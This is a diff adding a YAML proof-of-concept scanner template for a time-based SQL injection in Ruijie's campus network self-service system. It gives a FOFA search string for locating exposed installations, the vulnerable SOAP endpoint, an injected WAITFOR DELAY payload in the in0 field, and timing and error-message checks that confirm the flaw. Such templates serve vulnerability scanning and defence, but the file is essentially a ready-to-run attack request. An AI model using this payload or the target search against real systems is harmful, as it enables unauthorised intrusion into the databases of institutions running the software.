@@ -1,0 +1,76 @@
+id: poc-yaml-ruijie-campus-network-self-service-operatorreportorroamservice-sqli
+info:
+  name: 锐捷 校园网自助服务系统 operatorReportorRoamService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 锐捷 校园网自助服务系统
+  fofa: title=="校园网自助服务系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /selfservice/service/operatorReportorRoamService
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+    xmlns:ser="http://service.webservice.common.spl.ruijie.com">
+
+    <soapenv:Header/>
+
+    <soapenv:Body>
+
+    <ser:queryOperatorUuid>
+
+    <!--type: string-->
+
+    <ser:in0>'';WAITFOR DELAY ''0:0:{{.t1}}''--</ser:in0>
+
+    </ser:queryOperatorUuid>
+
+    </soapenv:Body>
+
+    </soapenv:Envelope>'
+  expression: 'status_code == 200 &&
+
+    contains(body,"请输入对应对接运营商") &&
+
+    contains(content_type,"text/xml") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+- method: POST
+  path: /selfservice/service/operatorReportorRoamService
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+    xmlns:ser="http://service.webservice.common.spl.ruijie.com">
+
+    <soapenv:Header/>
+
+    <soapenv:Body>
+
+    <ser:queryOperatorUuid>
+
+    <!--type: string-->
+
+    <ser:in0>''</ser:in0>
+
+    </ser:queryOperatorUuid>
+
+    </soapenv:Body>
+
+    </soapenv:Envelope>'
+  expression: 'status_code == 200 &&
+
+    contains(body,"执行过程中发生异常，请查看后台错误日志") &&
+
+    !contains(body,"请输入对应对接运营商")
+
+    '
+transport: http
